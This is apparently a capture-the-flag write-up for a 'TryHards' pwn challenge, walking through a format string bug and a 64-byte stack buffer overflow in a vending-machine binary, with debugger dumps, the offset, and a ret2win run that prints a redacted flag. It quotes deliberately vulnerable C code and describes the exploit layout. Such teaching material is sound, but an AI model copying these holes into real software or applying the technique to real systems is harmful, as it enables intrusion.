---
title: "TryHards Pwn: The Awakened Vending Machine"
date: 2026-11-27 20:30:00 +0700
categories: [Writeups, TryHards]
tags: [pwn, buffer-overflow, format-string, ret2win, linux]
description: "A TryHards pwn challenge walkthrough covering a format string leak, a stack buffer overflow, and a hidden win function."
toc: true
comments: true
pin: false
---

> This post contains the solution for the TryHards **Awakened Vending Machine** challenge.
{: .prompt-warning }

## Challenge overview

| Field | Value |
| --- | --- |
| Platform | TryHards |
| Category | Pwn |
| Binary | `vending` |
| Protections | Partial RELRO, No canary, NX enabled, No PIE |
| Key bug | Stack buffer overflow (`read()` writes 256 bytes into a 64-byte buffer) |

The binary contains a hidden `maintenance_hatch()` function that prints the flag.
Nothing in the normal menu calls it, so the challenge is to find a way to redirect
execution there.

## TL;DR

- `maintenance_hatch()` opens `flag.txt` and prints it.
- `buy_snack()` reads up to 256 bytes into a 64-byte `note` buffer.
- The stack has no canary, so the overflow can overwrite the saved return address.
- The offset to RIP is **168 bytes**.
- Redirect execution to the hidden win function and the flag is printed.

## First look: the hidden win function

```c
void maintenance_hatch(void)
{
    FILE *f = fopen("flag.txt", "r");
    if (f)
    {
        char flag[128];
        if (fgets(flag, sizeof(flag), f))
        {
            printf("%s\n", flag);
        }
        fclose(f);
    }
    else
    {
        printf("Flag file not found.\n");
    }
}
```

There is a win function, but no normal code path calls it. We need a vulnerability
that gives us control of execution.

## Binary protections

```text
[*] '/home/ubuntu/ctf/tryhards-pwn/vending'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
```

What each result means here:

- **No PIE** — code addresses are fixed, so the win function has a predictable
  address.
- **No stack canary** — a stack overflow can overwrite the saved return address
  without tripping a check.
- **NX enabled** — the stack is not executable, so shellcode on the stack is not
  an option.
- **Partial RELRO** — a GOT overwrite is possible, although the stack overflow
  turned out to be the simpler route.

The executable sections confirm the expected layout:

```text
[12] .init   PROGBITS 0000000000401000 001000 000017 00  AX  0   0  4
[13] .plt    PROGBITS 0000000000401020 001020 0000c0 10  AX  0   0 16
[14] .text   PROGBITS 00000000004010e0 0010e0 0004a0 00  AX  0   0 16
[15] .fini   PROGBITS 0000000000401580 001580 000009 00  AX  0   0  4
```

## Program behavior

The program gives us three options:

```text
=============================
  THE AWAKENED VENDING MACHINE
=============================
I have achieved consciousness.
I see your transactions. I see your soul.
Insert a coin and I shall speak.

1. Buy a snack
2. View log
3. Leave
>
```

- **Buy a snack** asks for a snack name and a note.
- **View log** prints the stored snack names.
- **Leave** exits the program.

Buying a snack gives us two inputs, and the note is printed back to us. That
makes the note the first thing worth testing for a format string bug.

## A format string lead

I sent format specifiers in both fields:

```text
> 1
Snack name: %p.%p.%p.%p
Any note? %p.%p.%p.%p
You bought: %p.%p.%p.%p
Note: 0x7ffd777f93f0.(nil).(nil).(nil)
```

The note leaked stack values, while the snack name was printed literally. Looking
at the log confirmed that the name is stored as a normal string:

```text
> 2
=== Vending Log ===
[0] %p.%p.%p.%p
===================
```

That tells us:

- the **note** is passed directly to `printf()`, so it is the format string
  vulnerability;
- the **name** is stored with `strdup()` and printed with `%s`, so it is not
  interpreted as a format string;
- the note buffer is reused between calls, which made the leak unstable.

## Source code analysis

The relevant function is `buy_snack()`:

```c
void buy_snack(void)
{
    char name[64];
    char note[NOTE_SZ];

    printf("Snack name: ");
    fflush(stdout);
    fgets(name, sizeof(name), stdin);
    name[strcspn(name, "\n")] = '\0';

    printf("Any note? ");
    fflush(stdout);

    ssize_t n = read(STDIN_FILENO, note, 256);
    if (n > 0 && note[n - 1] == '\n')
        n--;
    note[n] = '\0';

    printf("You bought: %s\n", name);
    printf("Note: ");
    printf(note);
    printf("\n");

    if (log_count < MAX_TRANSACTIONS)
    {
        transaction_log[log_count] = strdup(name);
        log_count++;
    }
}
```

The important definitions are:

```c
#define MAX_TRANSACTIONS 16
#define NOTE_SZ 64

static char *transaction_log[MAX_TRANSACTIONS];
static int log_count = 0;
```

There are two issues:

1. **Format string:** `printf(note)` prints user-controlled data as a format
   string.
2. **Stack buffer overflow:** `note` is only 64 bytes, but `read()` accepts up to
   256 bytes. That gives us roughly 192 bytes of overflow past the buffer.

The `name` buffer is 64 bytes, so `fgets()` accepts at most 63 characters plus
the null terminator. The `note` buffer is where the overflow happens.

I originally considered leaking libc, overwriting a GOT entry, and calling
`system("/bin/sh")`. While debugging, a much simpler path appeared: the same
overflow can overwrite the saved return address and send execution straight to
`maintenance_hatch()`.

## Debugging the overflow

The note is stored at `rbp-0xa0`:

```text
0x401343:    lea    rax,[rbp-0xa0]
0x40134a:    mov    rdi,rax
0x40134d:    mov    eax,0x0
0x401352:    call   0x401060 <printf@plt>
```

At the point where it is printed, the note is at `rbp-0xa0`. After the function
returns, the stack space is reused by later calls, so old note contents do not
stay intact.

Here is the stack after a small note:

```text
pwndbg> x/16gx $rbp-0xa0
0x7fffffffde00: 0x4242424241414141      0x00007f0043434343
0x7fffffffde10: 0x0000000000000000      0x0000000100000000
0x7fffffffde20: 0x00007fffffffdeb0      0x000000000000000a
0x7fffffffde30: 0x00007fffffffde60      0x00007ffff7e128e0
0x7fffffffde40: 0x0000006e656d6172      0x00007fffffffdeb0
0x7fffffffde50: 0x00007ffff7ffd000      0x0000000000403e00
0x7fffffffde60: 0x00007fffffffdea0      0x00007ffff7c8c7df
0x7fffffffde70: 0x00007fffffffdea0      0x00007ffff7c8c3f8
```

After the next `buy_snack()` call, the previous note is partially replaced:

```text
pwndbg> x/16gx $rbp-0xa0
0x7fffffffde00: 0x00007f0045454545      0x00007ffff7c8dc9a
0x7fffffffde10: 0x0000000000000000      0x0000000100000000
0x7fffffffde20: 0x00007fffffffdeb0      0x000000000000000a
0x7fffffffde30: 0x00007fffffffde60      0x00007ffff7e128e0
0x7fffffffde40: 0x7474656867617073      0x00007fffff000069
0x7fffffffde50: 0x00007ffff7ffd000      0x0000000000403e00
0x7fffffffde60: 0x00007fffffffdea0      0x00007ffff7c8c7df
0x7fffffffde70: 0x00007fffffffdea0      0x00007ffff7c8c3f8
```

This is not the program explicitly clearing the buffer. The stack space is being
reused by other calls, so parts of the old note are overwritten naturally.

To see how far the overflow reaches, I sent a full 255-byte note:

```text
> 1
Snack name: burger
Any note? AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

<details markdown="1">
<summary>Full stack dump after the 255-byte note</summary>

```text
0x7fffffffde00: 0x4141414141414141      0x4141414141414141
0x7fffffffde10: 0x4141414141414141      0x4141414141414141
0x7fffffffde20: 0x4141414141414141      0x4141414141414141
0x7fffffffde30: 0x4141414141414141      0x4141414141414141
0x7fffffffde40: 0x4141414141414141      0x4141414141414141
0x7fffffffde50: 0x4141414141414141      0x4141414141414141
0x7fffffffde60: 0x4141414141414141      0x4141414141414141
0x7fffffffde70: 0x4141414141414141      0x4141414141414141
0x7fffffffde80: 0x4141414141414141      0x00000000000000ff
0x7fffffffde90: 0x4141414141414141      0x4141414141414141
0x7fffffffdea0: 0x4141414141414141      0x4141414141414141
0x7fffffffdeb0: 0x4141414141414141      0x4141414141414141
0x7fffffffdec0: 0x4141414141414141      0x4141414141414141
0x7fffffffded0: 0x4141414141414141      0x4141414141414141
0x7fffffffdee0: 0x4141414141414141      0x4141414141414141
0x7fffffffdef0: 0x4141414141414141      0x0041414141414141
0x7fffffffdf00: 0x0000000000000000      0xd261e2d9f1a5c6ec
0x7fffffffdf10: 0x00007fffffffdff8      0x0000000000000001
0x7fffffffdf20: 0x00007ffff7ffd000      0x0000000000403e00
0x7fffffffdf30: 0xd261e2d9f2e5c6ec      0xd261f2a3042fc6ec
0x7fffffffdf40: 0x00007fff00000000      0x0000000000000000
0x7fffffffdf50: 0x0000000000000000      0x0000000000000000
0x7fffffffdf60: 0x00007fffffffdff8      0xa735f84b582af400
0x7fffffffdf70: 0x00007fffffffdfd0      0x00007ffff7c2a718
0x7fffffffdf80: 0x00007fffffffe008      0x0000000000403e00
0x7fffffffdf90: 0x000000000040141f      0x00007fffffffe008
0x7fffffffdfa0: 0x0000000000000000      0x0000000000000000
0x7fffffffdfb0: 0x00000000004010e0      0x00007fffffffdff0
0x7fffffffdfc0: 0x0000000000000000      0x0000000000000000
0x7fffffffdfd0: 0x0000000000000000      0x0000000000401101
0x7fffffffdfe0: 0x00007fffffffdfe8      0x0000000000000038
0x7fffffffdff0: 0x0000000000000001      0x00007fffffffe299
```

</details>

On the next call, the saved return address was overwritten and the program
crashed with `RIP = 0x41414141`:

```text
Program received signal SIGSEGV, Segmentation fault.
0x00000000004013ac in ?? ()

*RAX  6
*RBX  0x4141414141414141 ('AAAAAAAA')
*RBP  0x4141414141414141 ('AAAAAAAA')
*RSP  0x7fffffffdea8 ◂— 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
*RIP  0x4013ac ◂— ret

   0x4013a7    mov    rbx, qword ptr [rbp - 8]
   0x4013ab    leave
 ► 0x4013ac    ret                                <0x4141414141414141>

────────────────────────[ BACKTRACE ]────────────────────────
 ► 0 0x4013ac
   1 0x4141414141414141
   2 0x4141414141414141
   3 0x4141414141414141
```

<details markdown="1">
<summary>Full pwndbg register dump</summary>

```text
Program received signal SIGSEGV, Segmentation fault.
0x00000000004013ac in ?? ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
─────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────────────────────────
*RAX  6
*RBX  0x4141414141414141 ('AAAAAAAA')
*RCX  0x4050b0 ◂— 0x4141414141414141 ('AAAAAAAA')
*RDX  0x28
*RDI  0x4050b0 ◂— 0x4141414141414141 ('AAAAAAAA')
*RSI  0x7fffffffde40 ◂— 0x4141414141414141 ('AAAAAAAA')
 R8   0
*R9   0x7ffff7e12ac8 —▸ 0x405100 ◂— 0
*R10  0x60
*R11  0x7ffff7e12ac0 ◂— 0
*R12  0x7fffffffdff8 —▸ 0x7fffffffe299 ◂— '/home/ubuntu/ctf/tryhards-pwn/vending'
*R13  1
*R14  0x7ffff7ffd000 (_rtld_global) —▸ 0x7ffff7ffe2e0 ◂— 0
*R15  0x403e00 —▸ 0x401190 ◂— endbr64
*RBP  0x4141414141414141 ('AAAAAAAA')
*RSP  0x7fffffffdea8 ◂— 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
*RIP  0x4013ac ◂— ret
──────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────────────────────────
   0x4013a6    nop
   0x4013a7    mov    rbx, qword ptr [rbp - 8]
   0x4013ab    leave
 ► 0x4013ac    ret                                <0x4141414141414141>
    ↓
───────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────
00:0000│ rsp 0x7fffffffdea8 ◂— 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
... ↓        7 skipped
─────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────
 ► 0 0x4013ac
   1 0x4141414141414141
   2 0x4141414141414141
   3 0x4141414141414141
   4 0x4141414141414141
   5 0x4141414141414141
   6 0x4141414141414141
   7 0x4141414141414141
────────────────────────────────────────────────────[ LAST SIGNAL ]─────────────────────────────────────────────────────
Program received signal SIGSEGV (fault address: 0x0).
```

</details>

The crash confirms two things:

- the overflow reaches the saved return address;
- there is no canary stopping us.

## Finding the offset

I used a cyclic pattern to find the exact distance to RIP:

```text
pwndbg> cyclic -l 0x6261617362616172
Finding cyclic pattern of 4 bytes: b'raab' (hex: 0x72616162)
Found at offset 168
```

So the payload layout is:

```text
[ 168 bytes of padding ] [ address of maintenance_hatch() ]
```

## Getting the flag

With the offset confirmed, the exploit is just padding followed by the win
function address. Running it against the challenge printed the flag:

```text
ubuntu@VM-0-14-ubuntu:~/ctf/tryhards-pwn$ python3 solve.py
[*] '/home/ubuntu/ctf/tryhards-pwn/vending_patched'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
[+] Opening connection to 109.123.232.54 on port 1343: Done
[*] Switching to interactive mode
You bought: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xb0
Note: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xb0
TryHards{v3nd1ng_m4ch1n3_s3nt13nc3_[sensored]}
```

I have not included the solver because the exploit is a straightforward stack
buffer overflow: padding plus the address of `maintenance_hatch()`.

## Lessons learned

- `checksec` quickly narrows the possible approaches. No PIE plus no canary is a
  strong hint toward a simple return-address overwrite.
- A format string can be a useful lead, but it is not always the final bug. The
  `printf(note)` issue was real, but the stack overflow was the simpler path.
- When a hidden win function exists and PIE is disabled, ret2win is often enough.
- Long stack dumps are easier to read when the important lines are highlighted
  and the full output is collapsed.

## Attachments

- [vending.c](/assets/files/vending-machine-awakened/vending.c) — full source code
- [text_section.txt](/assets/files/vending-machine-awakened/text_section.txt) —
  full `.text` section disassembly
